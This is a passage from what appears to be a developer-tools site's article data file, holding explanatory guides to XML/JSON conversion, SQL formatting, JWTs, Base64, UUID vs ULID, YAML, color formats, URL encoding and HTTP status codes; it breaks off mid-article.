### Text Nodes with Attributes
When an XML element has both attributes and text content, the JSON must represent both, often using special keys like \`#text\` for the text content.

### Namespaces
XML supports XML namespaces (\`xmlns:prefix="uri"\`). These can complicate JSON representations significantly. Most converters strip namespaces or flatten them.

### CDATA Sections
\`<![CDATA[... raw content ...]]>\` sections contain text that should not be parsed as XML. These are typically converted to plain strings in JSON.

### Comments
XML comments (\`<!-- comment -->\`) are discarded during JSON conversion as JSON has no comment syntax.

## Popular Conversion Libraries

### JavaScript
- **xml2js**: Simple, widely used Node.js library
- **fast-xml-parser**: High-performance with customizable output
- **xml-js**: Handles attributes and elements consistently

### Python
- **xmltodict**: Converts XML to Python dicts (JSON-serializable)
- **lxml**: Comprehensive XML/HTML processing with ElementTree API

### Command Line
- **xq** (xq command from yq/xq tools): XPath queries with JSON output
- **python3 -c "import xmltodict, json, sys; print(json.dumps(xmltodict.parse(sys.stdin.read()), indent=2))"**: Quick one-liner

## XML Web Services (SOAP)

Many legacy enterprise systems use SOAP (Simple Object Access Protocol), which wraps business data in XML envelopes:

\`\`\`xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <userId>123</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
\`\`\`

Converting SOAP responses to JSON typically requires stripping the envelope and extracting the relevant payload.

## Using the XML-to-JSON Converter

Our tool:
1. **Paste XML content** — accepts any well-formed XML
2. **Instant JSON output** — converts in real time
3. **Attribute handling** — choose how to represent XML attributes
4. **Array detection** — correctly identifies repeated elements as arrays
5. **Formatting options** — indented (readable) or compact output
6. **Copy JSON** — one-click copy of the result
7. **Download** — save the JSON file

Use it for converting API responses from legacy SOAP or XML services, transforming configuration files, and integrating XML data feeds into modern applications.
`,
  },

  // ─── DB-only articles (synced from Supabase) ──────────────────────────────
  {
    slug: 'sql-formatter-guide',
    toolPath: '/sql-format',
    title: 'How to Format SQL Queries for Better Readability',
    description: 'Learn SQL formatting best practices and use our formatter to clean up messy queries.',
    keywords: ["SQL formatter","SQL prettify","format SQL online","SQL beautifier"],
    category: 'Development',
    publishedAt: '2025-07-11',
    content: `## What Is SQL Formatting?

SQL formatting (also called SQL beautification or SQL pretty-printing) is the process of restructuring SQL queries to follow consistent indentation, capitalization, and line-break conventions. Well-formatted SQL is dramatically easier to read, debug, and maintain.

## Why SQL Formatting Matters

Unformatted SQL queries can be nearly impossible to understand:
\`\`\`sql
SELECT u.id,u.name,u.email,o.total,o.created_at FROM users u JOIN orders o ON u.id=o.user_id WHERE u.status='active' AND o.total>100 ORDER BY o.created_at DESC LIMIT 20;
\`\`\`

Formatted equivalent:
\`\`\`sql
SELECT
  u.id,
  u.name,
  u.email,
  o.total,
  o.created_at
FROM users u
JOIN orders o ON u.id = o.user_id
WHERE
  u.status = 'active'
  AND o.total > 100
ORDER BY o.created_at DESC
LIMIT 20;
\`\`\`

The formatted version makes the query structure immediately clear.

## SQL Formatting Conventions

### Keyword Case
SQL keywords (SELECT, FROM, WHERE, JOIN, ORDER BY) are traditionally written in UPPERCASE to distinguish them from identifiers (table/column names). Some style guides prefer lowercase keywords for reduced visual noise.

### Indentation
Each major clause starts on a new line. Sub-clauses (conditions in WHERE, columns in SELECT) are indented. JOIN conditions are typically indented under the JOIN keyword.

### Comma Placement
Two common styles:
- **Trailing commas**: Column at end of line, comma before next item
- **Leading commas**: Comma at start of each line (makes it easier to comment out the last item)

### Aliases
Table aliases improve readability in complex queries. Short, meaningful aliases (u for users, o for orders) are preferred over arbitrary single letters for large queries.

## SQL Dialects

Different database systems have their own SQL variations:
- **PostgreSQL**: Extends SQL with arrays, JSONB, window functions, CTEs
- **MySQL/MariaDB**: Has non-standard features like GROUP BY without aggregation
- **SQLite**: Simplified, serverless database with some limitations
- **SQL Server (T-SQL)**: Microsoft's dialect with procedural extensions
- **Oracle (PL/SQL)**: Oracle's extended SQL with procedural programming

Formatters that understand dialects can preserve dialect-specific syntax correctly.

## Common SQL Query Patterns

### Common Table Expressions (CTEs)
\`\`\`sql
WITH active_users AS (
  SELECT id, name
  FROM users
  WHERE status = 'active'
),
high_value_orders AS (
  SELECT user_id, SUM(total) AS total_spent
  FROM orders
  GROUP BY user_id
  HAVING SUM(total) > 1000
)
SELECT au.name, hvo.total_spent
FROM active_users au
JOIN high_value_orders hvo ON au.id = hvo.user_id;
\`\`\`

### Window Functions
\`\`\`sql
SELECT
  name,
  salary,
  department,
  RANK() OVER (
    PARTITION BY department
    ORDER BY salary DESC
  ) AS salary_rank
FROM employees;
\`\`\`

### Subqueries
\`\`\`sql
SELECT name, email
FROM users
WHERE id IN (
  SELECT DISTINCT user_id
  FROM orders
  WHERE created_at >= NOW() - INTERVAL '30 days'
);
\`\`\`

## SQL Linting

Beyond formatting, SQL linters check for common mistakes:
- SELECT * in production code (retrieves unnecessary columns)
- Missing WHERE clause on UPDATE/DELETE (affects all rows)
- Implicit column references in JOINs (ambiguous)
- Functions in WHERE clauses that prevent index usage
- Non-ANSI SQL that reduces portability

## Using the SQL Formatter Tool

Our tool:
1. **Paste any SQL query** — handles SELECT, INSERT, UPDATE, DELETE, CREATE, and more
2. **Instant formatting** — applies consistent indentation and line breaks
3. **Dialect support** — optimizes for PostgreSQL, MySQL, SQL Server, or standard SQL
4. **Keyword case** — choose UPPERCASE, lowercase, or preserve original
5. **Indentation style** — 2 spaces, 4 spaces, or tabs
6. **Copy formatted SQL** — one-click copy for immediate use

Use it for improving readability of complex queries before committing to version control, formatting queries copied from logs or error messages, and standardizing SQL style across your team.`,
  },
  {
    slug: 'jwt-explained',
    toolPath: '/jwt-parser',
    title: 'JWT Explained: How to Read and Validate JSON Web Tokens',
    description: 'Decode and inspect any JWT token. Learn about header, payload, signature, expiry, and common security mistakes.',
    keywords: ["JWT parser","decode JWT","JSON web token","JWT security","JWT expiry"],
    category: 'Crypto',
    publishedAt: '2025-06-05',
    content: `## What Is a JWT?

A **JSON Web Token (JWT)** is a compact, URL-safe token format for representing claims (assertions) between two parties. Defined by RFC 7519, JWTs are the standard mechanism for authentication tokens, API authorization, and secure information exchange in modern web applications.

## JWT Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNzAwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
\`\`\`

### Header
\`\`\`json
{
  "alg": "HS256",
  "typ": "JWT"
}
\`\`\`
Specifies the token type (JWT) and the signing algorithm (HS256 = HMAC-SHA256).

### Payload (Claims)
\`\`\`json
{
  "sub": "user123",
  "name": "Alice",
  "email": "alice@example.com",
  "iat": 1700000000,
  "exp": 1700003600
}
\`\`\`

### Signature
Created by signing the encoded header and payload with a secret key (or private key for RS256/ES256).

## Standard Claims

Reserved claim names with special meaning:
- **iss** (Issuer): Who created the token
- **sub** (Subject): Who the token is about (usually user ID)
- **aud** (Audience): Who the token is intended for
- **exp** (Expiration): When the token expires (Unix timestamp)
- **nbf** (Not Before): Token is invalid before this time
- **iat** (Issued At): When the token was created
- **jti** (JWT ID): Unique identifier for the token

## JWT Signing Algorithms

### Symmetric (Shared Secret)
- **HS256/HS384/HS512**: HMAC with SHA-256/384/512
- Same key used for signing and verification
- Simple but requires sharing the secret

### Asymmetric (Public/Private Key)
- **RS256/RS384/RS512**: RSA with SHA-256/384/512
- Private key signs, public key verifies
- Third parties can verify without the signing key

- **ES256/ES384/ES512**: ECDSA (more efficient than RSA)
- Smaller key sizes for same security level

## Security Considerations

### The "alg: none" Attack
Early JWT libraries accepted unsigned tokens when alg was set to "none". Always validate the algorithm header and reject unexpected algorithms.

### Secret Key Strength
For HS256, use at least 256 bits of random entropy. Never use weak secrets like "secret" or "password". Use \`crypto.randomBytes(32)\` in Node.js.

### Token Storage
- **localStorage**: Accessible to JavaScript, vulnerable to XSS
- **HttpOnly cookies**: Not accessible to JavaScript, protected from XSS, but require CSRF protection
- Recommended: HttpOnly, Secure, SameSite=Strict cookies

### Token Revocation Challenge
JWTs are stateless — servers don't track which tokens are valid. Once issued, a JWT is valid until it expires. Workarounds:
- Short expiration times (15 minutes)
- Token blacklist (defeats statelessness)
- Refresh token rotation

## JWTs in Authentication Flow

1. User logs in with credentials
2. Server validates credentials
3. Server creates JWT signed with secret key
4. JWT returned to client
5. Client sends JWT in Authorization header on subsequent requests
6. Server validates JWT signature and claims
7. If valid, processes the request

\`\`\`http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
\`\`\`

## Using the JWT Parser Tool

Our tool:
1. **Paste any JWT** — immediately decoded and displayed
2. **Shows all three parts** — header, payload, and signature separately
3. **Claim interpretation** — timestamps shown as human-readable dates
4. **Validation status** — checks token expiration
5. **Algorithm identification** — shows which signing algorithm was used
6. **Copy parts** — extract header or payload as JSON

Use it for debugging authentication issues, understanding JWT contents during development, and verifying token structure and claims.`,
  },
  {
    slug: 'base64-string-guide',
    toolPath: '/base64-string-converter',
    title: 'Base64 Encoding Explained: What It Is and When to Use It',
    description: 'Learn what Base64 encoding is, how it works, and common use cases in web development.',
    keywords: ["base64 encode","base64 decode","base64 online","base64 string converter","encoding"],
    category: 'Converter',
    publishedAt: '2025-06-15',
    content: `## What Is Base64 Encoding?

Base64 is an encoding scheme that converts binary data to a text format using a 64-character alphabet (A-Z, a-z, 0-9, +, /). It's not encryption — it provides no security — but it's the universal solution for transmitting binary data through text-only channels.

## Why Base64 Exists

The original internet protocols (SMTP, HTTP/1.0, JSON) were designed for 7-bit ASCII text. Binary data — images, files, cryptographic keys — cannot be safely transmitted through these channels because:
- Certain byte values have special meaning (null bytes, newlines, control characters)
- Some systems strip or transform high-bit characters
- Binary data may contain sequences that resemble protocol commands

Base64 solves this by converting any binary data to a safe subset of printable ASCII characters.

## The Base64 Character Set

Standard Base64 uses 64 printable characters:
- A-Z (26 characters)
- a-z (26 characters)  
- 0-9 (10 characters)
- + and / (2 characters)
- = for padding

This 64-character set can be represented with 6 bits per character (2^6 = 64).

## How Base64 Encoding Works

Base64 converts 3 bytes (24 bits) to 4 characters (4 × 6 bits = 24 bits):

1. Take 3 bytes: 01001101 01100001 01101110 ("Man")
2. Group into 6-bit chunks: 010011 010110 000101 101110
3. Map to Base64 characters: T W F u
4. Result: "TWFu"

When the input isn't divisible by 3, = padding is added:
- 1 extra byte → 2 characters + "=="
- 2 extra bytes → 3 characters + "="

## Size Overhead

Base64 increases data size by approximately 33%:
- 3 bytes in → 4 bytes out (ratio = 1.333...)
- 1 MB file becomes ~1.37 MB as Base64

With line breaks (MIME requires 76-char lines), overhead increases to ~37%.

## Base64 Variants

### Standard Base64 (RFC 4648)
Uses + and /. Padding with =. Used in MIME email, data URIs.

### URL-Safe Base64 (RFC 4648 §5)
Replaces + with - and / with _ to avoid URL encoding conflicts. Used in JWT tokens, URL parameters, filenames.

### Base64 Without Padding
Some systems (like many JWT implementations) omit the = padding. The decoder must handle this.

### MIME Base64
Standard Base64 with 76-character line breaks (
). Used in email attachments.

## Common Uses of Base64

### Data URLs (CSS/HTML)
Embed small images directly in CSS or HTML without separate files:
\`\`\`html
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg..." />
\`\`\`

### JWT Tokens
All three parts of a JWT (header, payload, signature) are Base64URL encoded.

### API Authentication
HTTP Basic Auth encodes credentials as Base64:
\`\`\`
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
\`\`\`

### Cryptographic Keys
PEM format (used for SSL certificates, SSH keys) wraps Base64-encoded DER binary:
\`\`\`
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
\`\`\`

### Email Attachments (MIME)
All email attachments are Base64 encoded in the MIME multipart format.

## Decoding in JavaScript and Python

\`\`\`javascript
// Encode
const encoded = btoa('Hello, World!');  // 'SGVsbG8sIFdvcmxkIQ=='
// Decode
const decoded = atob('SGVsbG8sIFdvcmxkIQ==');  // 'Hello, World!'
// For binary data, use Uint8Array approaches
\`\`\`

\`\`\`python
import base64
encoded = base64.b64encode(b'Hello, World!').decode()  # 'SGVsbG8sIFdvcmxkIQ=='
decoded = base64.b64decode('SGVsbG8sIFdvcmxkIQ==')  # b'Hello, World!'
\`\`\`

## Using the Base64 String Converter

Our tool:
1. **Encode text or data** — convert any string to Base64
2. **Decode Base64** — restore original content from encoded string
3. **Choose variant** — standard, URL-safe, or MIME (with line breaks)
4. **Unicode support** — properly handles non-ASCII text with UTF-8
5. **Copy result** — one-click copy of encoded/decoded output

Use it for generating data URLs, debugging JWT contents, encoding API credentials, and understanding Base64-encoded data in web applications.`,
  },
  {
    slug: 'uuid-vs-ulid',
    toolPath: '/uuid-generator',
    title: 'UUID vs ULID: Which Unique ID Should You Use?',
    description: 'Compare UUID and ULID for unique identifier generation. Learn when to use each and how they differ in sortability and database performance.',
    keywords: ["UUID generator","ULID generator","unique ID","UUID vs ULID","sortable ID"],
    category: 'Crypto',
    publishedAt: '2025-06-04',
    content: `## UUID vs. ULID: Choosing the Right Unique Identifier

When building applications that need unique identifiers for records, two popular formats stand out: **UUID** (Universally Unique Identifier) and **ULID** (Universally Unique Lexicographically Sortable Identifier). Understanding their differences helps you choose the right one for your use case.

## What Is a UUID?

UUID is defined by RFC 4122. The most common variant, UUID v4, is 128 bits of essentially random data:

\`\`\`
550e8400-e29b-41d4-a716-446655440000
\`\`\`

Format: 8-4-4-4-12 hexadecimal characters separated by hyphens (36 chars total).

### UUID Versions
- **v1**: Timestamp + MAC address. Sortable but exposes hardware info
- **v4**: Random. Most widely used — no information exposed
- **v5**: Namespace + SHA-1 hash. Deterministic from input
- **v7** (2023): Unix timestamp + random. Sortable — the modern recommendation
- **v8**: Custom/application-defined layout

## What Is a ULID?

ULID is a 128-bit identifier designed to be both unique and naturally sortable:

\`\`\`
01ARZ3NDEKTSV4RRFFQ69G5FAV
\`\`\`

Structure: 26 characters using Crockford's Base32 (0-9 and A-Z excluding I, L, O, U for readability)
- First 10 characters: 48-bit Unix millisecond timestamp
- Last 16 characters: 80 bits of randomness

## Key Differences

| Property | UUID v4 | UUID v7 | ULID |
|----------|---------|---------|------|
| Length | 36 chars (with hyphens) | 36 chars | 26 chars |
| Sortable | No | Yes (by creation time) | Yes (by creation time) |
| Timestamp-based | No | Yes (ms precision) | Yes (ms precision) |
| Case-sensitive | No | No | No |
| URL-safe | No (hyphens) | No (hyphens) | Yes |
| Monotonic within ms | No | Optional | Yes (each ULID increments) |
| Bit size | 128 bits | 128 bits | 128 bits |

## Database Performance Implications

### The UUID v4 Index Problem
Random UUIDs cause poor database performance when used as primary keys because:
- New records insert randomly throughout the B-tree index
- Causes page splits and fragmentation
- Reduces cache effectiveness (each insert touches a different page)

### Sequential IDs Are Faster
ULIDs and UUID v7 insert in time order, meaning:
- New records are typically appended to the end of the index
- Better cache utilization (recent data is "hot")
- Fewer page splits
- Better range scan performance for time-based queries

For high-write workloads, the difference can be 2-10x in insertion performance.

## When to Use UUID v4

- When you need compatibility with existing systems using UUID v4
- When you must not leak timestamp information in the ID
- When random distribution is specifically desired
- For identifiers not used as database primary keys (session tokens, etc.)

## When to Use ULID or UUID v7

- As database primary keys in append-heavy tables
- When IDs should be roughly time-sortable
- When you want URL-safe IDs (ULID has no hyphens)
- For distributed systems where IDs are generated across multiple nodes

## Security Considerations

- UUID v4 and ULID are NOT cryptographically secure — don't use them as secret tokens or authentication keys
- UUID v1's MAC address embedding exposes hardware information (privacy concern)
- ULIDs/UUID v7 timestamp exposure: anyone with the ID can determine approximately when a record was created

For secret tokens (password reset, API keys, session IDs), use cryptographically secure random generators.

## Using the UUID and ULID Generators

Our tool provides:
1. **Generate UUIDs** — versions 1, 4, 5, and 7 supported
2. **Generate ULIDs** — time-sorted, URL-safe identifiers
3. **Bulk generation** — create multiple IDs at once
4. **Timestamp extraction** — for ULID and UUID v7, shows the encoded timestamp
5. **Copy to clipboard** — single or all generated IDs

Use it for testing, seeding databases, generating unique identifiers for mock data, and understanding the structure of different ID formats.`,
  },
  {
    slug: 'json-to-yaml-guide',
    toolPath: '/json-to-yaml-converter',
    title: 'JSON to YAML Converter: When and Why to Use YAML',
    description: 'Convert JSON to YAML and understand the differences. Learn when YAML is better than JSON for configuration files.',
    keywords: ["JSON to YAML","convert JSON YAML","YAML vs JSON","YAML formatter","JSON converter"],
    category: 'Converter',
    publishedAt: '2025-06-16',
    content: `## JSON and YAML: Two Faces of Structured Data

JSON and YAML both represent the same types of structured data — objects (maps), arrays (lists), strings, numbers, booleans, and null values — but with very different syntaxes. Understanding when to use each format and how to convert between them is a key skill for developers and DevOps professionals.

## YAML's Advantages Over JSON

### Human Readability
YAML uses whitespace-based structure instead of braces and brackets:

**JSON:**
\`\`\`json
{
  "server": {
    "host": "localhost",
    "port": 8080
  },
  "features": ["auth", "logging", "cache"]
}
\`\`\`

**YAML:**
\`\`\`yaml
server:
  host: localhost
  port: 8080
features:
  - auth
  - logging
  - cache
\`\`\`

The YAML version has fewer special characters and reads more like plain English.

### Comments
YAML supports comments with #, which is essential for configuration files:
\`\`\`yaml
# Database connection settings
database:
  host: localhost  # Change for production
  port: 5432
  # Maximum connections in pool
  pool_size: 10
\`\`\`

JSON has no comment support.

### Multi-line Strings
YAML has elegant multi-line string syntax:
\`\`\`yaml
# Literal block (preserves newlines)
message: |
  Hello, World!
  This is a multi-line message.
  
# Folded block (collapses newlines to spaces)
description: >
  This long description will be
  joined into a single line.
\`\`\`

## JSON's Advantages Over YAML

- **Universal parser support**: Every language has a JSON parser built-in or trivially available
- **No indentation errors**: Braces/brackets are explicit — indentation doesn't matter
- **Simpler specification**: JSON spec is a single page; YAML spec is 80 pages
- **No type ambiguity**: Less prone to unintended type coercion
- **Better for APIs**: Native JavaScript/web format
- **Deterministic**: No anchors, aliases, or merge keys to confuse simple parsers

## YAML Type Coercion Pitfalls

YAML's automatic type inference can cause subtle bugs:

\`\`\`yaml
# These are NOT strings in YAML:
country: NO      # Parsed as boolean false
version: 1.0     # Parsed as float
enabled: true    # Boolean
octal: 0755      # Parsed as octal integer in YAML 1.1
\`\`\`

Always quote values you intend as strings:
\`\`\`yaml
country: "NO"
version: "1.0"
\`\`\`

## Converting JSON to YAML

The conversion is straightforward for most data:
- JSON objects become YAML mappings
- JSON arrays become YAML sequences
- JSON strings become YAML scalars (often unquoted if simple)
- JSON numbers and booleans are preserved
- Null becomes \`~\` or \`null\`

## YAML Features Without JSON Equivalents

**Anchors and Aliases:**
\`\`\`yaml
defaults: &defaults
  timeout: 30
  retries: 3

production:
  <<: *defaults
  host: prod.example.com
\`\`\`

When converting to JSON, anchors are resolved and values are inlined.

**Merge Keys:**
\`\`\`yaml
base: &base
  key: value

extended:
  <<: *base
  extra: more
\`\`\`

## Common Use Cases for JSON-to-YAML

- Converting API responses to Kubernetes manifests
- Transforming JSON config to docker-compose.yml
- Creating Ansible playbooks from JSON data
- Converting OpenAPI/Swagger specs to more readable YAML
- Generating Helm chart values from programmatic JSON

## Real-World Example: Kubernetes Deployment

**JSON (generated by tooling):**
\`\`\`json
{
  "apiVersion": "apps/v1",
  "kind": "Deployment",
  "metadata": {"name": "my-app"},
  "spec": {
    "replicas": 3,
    "selector": {"matchLabels": {"app": "my-app"}},
    "template": {
      "metadata": {"labels": {"app": "my-app"}},
      "spec": {
        "containers": [{"name": "app", "image": "my-app:latest", "ports": [{"containerPort": 8080}]}]
      }
    }
  }
}
\`\`\`

**YAML (human-maintained):**
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      labels:
        app: my-app
    spec:
      containers:
        - name: app
          image: my-app:latest
          ports:
            - containerPort: 8080
\`\`\`

The YAML format is standard for Kubernetes manifests maintained by humans.

## Using the JSON-to-YAML Converter

Our tool:
1. **Paste JSON data** — accepts any valid JSON
2. **Instant YAML output** — converts in real time
3. **Format preservation** — maintains data structure and types
4. **Copy YAML** — one-click copy for immediate use
5. **Roundtrip validation** — verify the YAML converts back to equivalent JSON

Use it for configuration file conversion, API documentation formatting, and integrating JSON-based tools with YAML-based infrastructure.`,
  },
  {
    slug: 'color-converter-guide',
    toolPath: '/color-converter',
    title: 'Color Formats Explained: HEX, RGB, HSL, and How to Convert Between Them',
    description: 'Learn about web color formats: HEX, RGB, RGBA, HSL, HSLA. Convert between them instantly.',
    keywords: ["color converter","hex to rgb","rgb to hsl","color formats","CSS colors"],
    category: 'Converter',
    publishedAt: '2025-06-18',
    content: `## Color Models and Why We Convert Between Them

Color can be represented in multiple mathematical models, each optimized for different use cases. Converting between models is essential for web development, graphic design, print production, and data visualization.

## The Main Color Models

### RGB (Red, Green, Blue)
The additive color model used by screens. Colors are created by mixing light:
- Range: Each channel 0-255 (8-bit) or 0-100%
- Used in: CSS, HTML, JavaScript, image files
- Example: rgb(255, 87, 51) = a vivid orange

RGB maps directly to how monitors work — each pixel has red, green, and blue subpixels whose intensities combine to create the perceived color.

### HEX (Hexadecimal)
A compact representation of RGB using base-16:
- Format: #RRGGBB where each pair is 00-FF
- Shorthand: #RGB when both digits are identical (#FF6600 = #F60)
- Used in: CSS, HTML, design tools, SVG
- Example: #FF5733 = rgb(255, 87, 51)

### HSL (Hue, Saturation, Lightness)
More intuitive for humans to work with:
- **Hue**: Color angle 0-360° (0=red, 120=green, 240=blue)
- **Saturation**: 0% (gray) to 100% (full color)
- **Lightness**: 0% (black) to 100% (white), 50% is "normal"
- Used in: CSS (natively supported), design systems, color pickers

HSL shines for programmatically generating color variations — changing only lightness creates tints and shades without color shift.

### HSV/HSB (Hue, Saturation, Value/Brightness)
Similar to HSL but used in most design software color pickers:
- **Value/Brightness**: 0% (black) to 100% (pure color)
- Used in: Photoshop, Illustrator, Figma color pickers

### CMYK (Cyan, Magenta, Yellow, Key/Black)
The subtractive color model for print:
- Range: Each component 0-100%
- Used in: Print design, professional publishing
- Note: RGB to CMYK conversion is not mathematically perfect — use ICC profiles for accurate print color

### Lab (L*a*b*)
Perceptually uniform color space:
- **L**: Lightness 0-100
- **a**: Green to red axis (-128 to 127)
- **b**: Blue to yellow axis (-128 to 127)
- Used in: Color science, image processing, perceptual color differences

## Conversion Formulas

### HEX to RGB
Split the hex string into pairs, convert each from hex to decimal:
- #FF5733 → R=255 (0xFF), G=87 (0x57), B=51 (0x33)

### RGB to HSL
Convert each RGB value to 0-1 range, then calculate:
- Find max and min values of R, G, B
- Lightness = (max + min) / 2
- Saturation depends on whether max equals min
- Hue depends on which channel is maximum

### RGB to CMYK
Convert RGB (0-255) to fractions (0-1), then:
- K (black) = 1 - max(R, G, B)
- C = (1 - R - K) / (1 - K)
- M = (1 - G - K) / (1 - K)
- Y = (1 - B - K) / (1 - K)

## Color Spaces and Profiles

Beyond color models, color spaces define how a color model maps to actual physical colors:
- **sRGB**: Standard for web and most consumer displays
- **Adobe RGB**: Wider gamut for professional photography
- **P3/DCI-P3**: Wide gamut for cinema and modern displays
- **CMYK profiles**: Varies by printer, ink, and paper type

When designs move between web (sRGB) and print (CMYK), colors can shift noticeably. Soft-proofing in design software helps preview how colors will appear in print.

## Using the Color Converter Tool

Our tool:
1. **Enter any color format** — HEX, RGB, HSL, HSV, or CMYK
2. **See all representations** — instantly converts to all other formats
3. **Visual color preview** — see the actual color
4. **Copy any format** — one-click copy in CSS-ready syntax
5. **Color picker integration** — visually select colors
6. **Accessibility check** — WCAG contrast ratios against white and black backgrounds

Use it for converting between design tool and CSS representations, preparing colors for print, and ensuring consistent color values across different parts of a project.`,
  },
  {
    slug: 'url-encoder-guide',
    toolPath: '/url-encoder',
    title: 'URL Encoding Explained: Why Special Characters Must Be Escaped',
    description: 'Learn why URLs need encoding, what percent-encoding is, and how to encode/decode URLs correctly.',
    keywords: ["URL encoding","percent encoding","URL encode decode","encodeURIComponent","URL special characters"],
    category: 'Web',
    publishedAt: '2025-06-28',
    content: `## What Is URL Encoding?

URL encoding (also called percent-encoding) converts characters that are not allowed or that have special meaning in URLs into a format that can be safely transmitted. The encoded form uses a percent sign (%) followed by the two-digit hexadecimal representation of the character's byte value.

## Why URLs Need Encoding

URLs can only contain a limited set of characters from the ASCII character set. Characters outside this set, and certain reserved characters that have special meaning in URL syntax, must be encoded.

### Reserved Characters
Some characters are "reserved" because they have special meaning in URL structure:
- ?: Query string delimiter
- &: Parameter separator
- =: Key-value separator
- #: Fragment identifier
- /: Path separator
- +: Space (in query strings)
- @, :, !: Various protocol uses

When these characters appear as data (not as structural elements), they must be encoded.

### Unsafe Characters
Characters that are not safe to transmit without encoding:
- Spaces: Encoded as %20 (or + in query strings)
- Special characters: <, >, ", {, }, |, \\, ^, \`, [, ]
- Non-ASCII characters: Any character outside the 128 ASCII characters

## Encoding Examples

| Original | Encoded |
|----------|---------|
| Hello World | Hello%20World |
| user@example.com | user%40example.com |
| a+b=c | a%2Bb%3Dc |
| café | caf%C3%A9 |
| 你好 | %E4%BD%A0%E5%A5%BD |
| emoji 😀 | %F0%9F%98%80 |

## URL Components and Their Rules

Different parts of a URL have different encoding rules:

### Path Segments
Slashes (/) are path separators. Within a path segment, encode reserved characters but keep unreserved ones (letters, digits, -, _, ., ~).

### Query Parameters
The key=value pairs after the ? separator. Both keys and values should be encoded. Historically, spaces can be + in query strings (application/x-www-form-urlencoded format).

### Fragment Identifiers
The portion after #. Used for in-page navigation. Should be encoded but + does not represent space here.

## JavaScript URL Encoding Functions

JavaScript provides several related functions:

### encodeURIComponent()
Encodes a single URI component (query value, path segment). Encodes everything except: A-Z a-z 0-9 - _ . ! ~ * ' ( )
\`\`\`javascript
encodeURIComponent('Hello World!')  // 'Hello%20World!'
encodeURIComponent('user@example.com')  // 'user%40example.com'
\`\`\`

### encodeURI()
Encodes a complete URI, preserving structural characters. Does NOT encode: ; , / ? : @ & = + $ # A-Z a-z 0-9 - _ . ! ~ * ' ( )
\`\`\`javascript
encodeURI('https://example.com/path?q=hello world')
// 'https://example.com/path?q=hello%20world'
\`\`\`

### URLSearchParams
The modern API for query string handling:
\`\`\`javascript
const params = new URLSearchParams({
  query: 'hello world',
  filter: 'a+b=c'
});
console.log(params.toString());
// 'query=hello+world&filter=a%2Bb%3Dc'
\`\`\`

## IDN (Internationalized Domain Names)

Non-ASCII domain names (like münchen.de) are handled through Punycode encoding:
- münchen.de → xn--mnchen-3ya.de

This allows Unicode in domain names while maintaining backward compatibility with DNS infrastructure.

## Using the URL Encoder Tool

Our tool:
1. **Encode any text** — converts to percent-encoded URL-safe format
2. **Decode encoded URLs** — restore original text from encoded form
3. **Component vs. full URL mode** — apply appropriate encoding rules
4. **Query parameter builder** — build properly encoded query strings from key-value pairs
5. **Copy result** — one-click copy of encoded/decoded output

Use it for building API URLs with special characters, debugging URL encoding issues, encoding user input for URL parameters, and understanding what percent-encoded URLs actually contain.`,
  },
  {
    slug: 'http-status-codes-guide',
    toolPath: '/http-status-codes',
    title: 'HTTP Status Codes: The Complete Developer Reference',
    description: 'A comprehensive guide to all HTTP status codes: 1xx, 2xx, 3xx, 4xx, 5xx with real-world examples.',
    keywords: ["HTTP status codes","404 not found","500 server error","HTTP 301 redirect","status code reference"],
    category: 'Web',
    publishedAt: '2025-06-29',
    content: `## Understanding HTTP Status Codes

HTTP status codes are three-digit numbers returned by web servers to indicate the result of an HTTP request. They are grouped into five categories and provide essential information about whether requests succeeded, failed, or require additional action.

## Status Code Categories

### 1xx Informational
Temporary responses indicating the server has received the request and is continuing to process it.
- **100 Continue**: Server has received headers, client should proceed with request body
- **101 Switching Protocols**: Server agrees to upgrade protocol (WebSocket handshake)
- **103 Early Hints**: Preload resources while the server prepares the response

### 2xx Success
The request was successfully received, understood, and accepted.
- **200 OK**: Standard success response for GET, POST
- **201 Created**: Resource created successfully (typically after POST)
- **204 No Content**: Success but no response body (DELETE operations)
- **206 Partial Content**: Server delivering part of a resource (range requests)

### 3xx Redirection
The client must take additional action to complete the request.
- **301 Moved Permanently**: Resource permanently moved; update your links/bookmarks
- **302 Found**: Temporary redirect; original URL may be used again
- **304 Not Modified**: Resource unchanged since last request; use cached version
- **307 Temporary Redirect**: Like 302 but preserves HTTP method
- **308 Permanent Redirect**: Like 301 but preserves HTTP method

### 4xx Client Errors
The request contains an error on the client side.
- **400 Bad Request**: Malformed request syntax or invalid parameters
- **401 Unauthorized**: Authentication required or credentials invalid
- **403 Forbidden**: Authenticated but not authorized for this resource
- **404 Not Found**: Resource doesn't exist at this URL
- **405 Method Not Allowed**: HTTP method not supported for this endpoint
- **409 Conflict**: State conflict (e.g., duplicate resource, version conflict)
- **410 Gone**: Resource permanently removed (unlike 404, confirms it existed)
- **422 Unprocessable Entity**: Request well-formed but semantically incorrect
- **429 Too Many Requests**: Rate limiting in effect

### 5xx Server Errors
The server failed to fulfill a valid request.
- **500 Internal Server Error**: Generic server-side error
- **501 Not Implemented**: Server doesn't support the request method
- **502 Bad Gateway**: Upstream server returned invalid response
- **503 Service Unavailable**: Server temporarily unavailable (maintenance, overload)
- **504 Gateway Timeout**: Upstream server didn't respond in time

## Status Codes in REST API Design

### Using Status Codes Semantically
Good APIs use status codes to communicate precisely:

\`\`\`
GET /users/123     → 200 OK (user found)
GET /users/999     → 404 Not Found (user doesn't exist)
POST /users        → 201 Created (user created)
DELETE /users/123  → 204 No Content (deleted, no body)
POST /login        → 401 Unauthorized (wrong password)
GET /admin/data    → 403 Forbidden (not an admin)
POST /users        → 409 Conflict (email already exists)
\`\`\`

### Common Mistakes
